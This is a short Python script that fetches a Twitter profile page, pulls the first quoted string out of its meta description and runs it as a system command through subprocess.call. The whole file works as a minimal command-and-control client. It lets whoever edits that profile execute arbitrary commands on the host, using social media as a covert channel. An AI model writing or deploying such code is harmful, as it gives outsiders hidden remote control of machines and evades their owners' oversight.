from bs4 import BeautifulSoup as soupy
import urllib.request
import re
import subprocess

html = urllib.request.urlopen("https://twitter.com/AlasUltra").read()
soup = soupy(html, "lxml")

x = soup.find("meta", {"name": "description"})['content']
command = re.findall('"([^"]*)"', x)

subprocess.call(command[0])




